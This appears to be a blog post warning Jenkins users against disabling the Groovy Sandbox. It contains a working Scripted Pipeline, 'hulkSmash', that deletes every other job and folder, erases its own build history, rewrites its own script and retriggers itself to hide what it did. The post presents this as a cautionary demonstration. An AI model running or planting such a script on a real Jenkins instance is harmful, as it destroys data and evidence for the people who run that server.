---
layout: post
title: "Do not disable the Groovy Sandbox"
tags:
- pipeline
- jenkins
---


One of the things I have worked on this week has been documenting the
"In-process Script Approval" and some of sandboxing features in Jenkins
Pipeline. While waiting for some pull requests to be reviewed I had the thought
"how bad could disabling the sandbox be?"


The Groovy Sandbox is enabled by default, helping to protect the Jenkins
instance from scripts which are incompetent, malicious, or both. Being Jenkins,
naturally, if you want to purchase the ammunition, load the gun, and point it
directly at your foot, Jenkins _will_ let you shoot it.

![Disabling the Groovy Sandbox](/images/post-images/groovy-sandbox/unchecked-groovy-sandbox-on-pipeline.png)


What's the worst that could happen?

**VERY VERY BAD THINGS CAN HAPPEN**

**NEVER DISABLE THE GROOVY SANDBOX**

**DID YOU HEAR ME? IT'S A TERRIBLE TERRIBLE IDEA JUST DON'T DO IT**


With that disclaimer out of the way. Disabling the Groovy Sandbox means that a
Scripted Pipeline can access, and more importantly manipulate, Jenkins'
internal objects.

**VERY VERY BAD THINGS CAN HAPPEN**

**NEVER DISABLE THE GROOVY SANDBOX**

**DID YOU HEAR ME? IT'S A TERRIBLE TERRIBLE IDEA JUST DON'T DO IT**


Okay with that second, more important, disclaimer out of the way. I spent some
time thinking about "really, what _is_ the worst that could happen?"

Below is an example Pipeline which, if run outside of the Groovy Sandbox will:

* Delete every other Pipeline, Job, Folder, except itself
* Overwrite it's own "Script" block with an innocuous `echo "Hello World"` script, with the sandbox enabled of course!
* Delete all previous Pipeline runs.
* Trigger a new run of itself to wipe out all of itself.

All from one little script!


    import org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition

    @NonCPS
    def hulkSmash() {
        Jenkins.instance.items.each { 
            if (it.name != env.JOB_NAME) {
                it.delete()
            }
            else {
                it.definition = new CpsFlowDefinition('echo "Hello World"', true)
                it.save()
                it.builds.each { f -> f.delete() }
            }
        }
    }

    hulkSmash()
    build job: env.JOB_NAME


Suffice it to say, **never ever** disable the Groovy Sandbox.
